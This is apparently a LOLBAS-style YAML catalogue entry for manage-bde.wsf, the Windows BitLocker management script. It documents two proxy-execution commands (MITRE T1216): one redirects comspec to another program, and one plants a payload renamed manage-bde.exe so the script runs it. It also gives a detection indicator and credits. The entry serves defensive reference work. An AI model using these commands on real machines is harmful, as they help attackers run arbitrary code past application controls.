---
name: Manage-bde.wsf
description: Script for managing BitLocker
functions:
  execute:
    - description: Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.
      code: set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
      mitreid: T1216
      mitrelink: https://attack.mitre.org/wiki/Technique/T1216
      operatingsystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Proxy execution from script
    - description: Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
      code: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
      mitreid: T1216
      mitrelink: https://attack.mitre.org/wiki/Technique/T1216
      operatingsystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Proxy execution from script
resources:
    - resource: https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
    - resource: https://twitter.com/bohops/status/980659399495741441
fullpath:
    - path: C:\Windows\System32\manage-bde.wsf
detection:
  - IOC: Manage-bde.wsf should normally not be invoked by a user
acknowledgement:
  - Person: Jimmy
    Handle: '@bohops'
  - Person: Daniel Bohannon
    Handle: '@danielbohannon'
---
